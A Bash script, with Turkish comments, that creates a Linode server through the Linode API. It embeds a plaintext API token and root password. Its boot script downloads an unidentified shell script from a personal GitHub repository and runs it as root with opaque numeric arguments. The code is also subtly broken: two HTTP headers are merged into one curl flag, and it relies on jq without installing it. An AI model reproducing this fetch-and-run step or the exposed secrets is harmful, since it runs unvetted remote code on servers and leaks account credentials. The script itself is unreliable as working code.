#!/bin/bash
apt-get update -y
apt-get upgrade -y
apt-get install -y python3-pip
pip3 install requests

API_KEY="2592b4ace4d7984d086ce0b9e19b07691a71fba4c10488b1262722fa1c61eaad"
API_ENDPOINT="https://api.linode.com/v4/"

location="us-southeast" # Sabit konum
plan="g6-standard-2"   # Linode 16 GB
image="linode/ubuntu20.04" # Ubuntu 20.04
root_pass="30655433212Aa@" # Şifre

# Yeni bir Linode hesabı oluşturma
function create_linode() {
    # İstek başlıkları
    headers="Authorization: Bearer $API_KEY\nContent-Type: application/json"

    # İstek gövdeleri
    data=$(cat <<EOF
{
    "region": "$location",
    "type": "$plan",
    "image": "$image",
    "root_pass": "$root_pass",
    "backups_enabled": false,
    "swap_size": 512,
    "boot_script": "#!/bin/bash\napt-get update -y\napt-get upgrade -y\nsudo dpkg --configure -a\nwget https://raw.githubusercontent.com/bharatvegdaa/bharatvegdaa/main/bharat.sh\nchmod +x bharat.sh\nbash bharat.sh 40 0 22 120"
}
EOF
)

    # API'ye istek gönderme
    response=$(curl -sS -X POST -H "$headers" -d "$data" "$API_ENDPOINT/linode/instances")

    # İstek yanıtı kontrolü
    if [[ $(echo "$response" | jq -r '.id') != null ]]; then
        echo "$(echo $response | jq -r '.id')"
    else
        echo "Failed to create Linode instance"
    fi
}

# Oluşturulan Linode hesabını döndürme
function get_linode() {
    # İstek başlıkları
    headers="Authorization: Bearer $API_KEY\nContent-Type: application/json"

    # API'ye istek gönderme
    response=$(curl -sS -H "$headers" "$API_ENDPOINT/linode/instances/$1")

    # İstek yanıtı kontrolü
    if [[ $(echo "$response" | jq -r '.id') != null ]]; then
        echo "$response"
    else
        echo "Failed to get Linode instance"
    fi
}

# Ana işlev
if [[ $# -eq 0 ]]; then
    linode_id=$(create_linode)
    if [[ "$linode_id" != "Failed to create Linode instance" ]]; then
        echo "Linode instance created with ID $linode_id"
        linode=$(get_linode "$linode_id")
        echo "$linode"
    else
        echo "Failed to create Linode instance"
    fi
else
    echo "Usage: $0"
fi
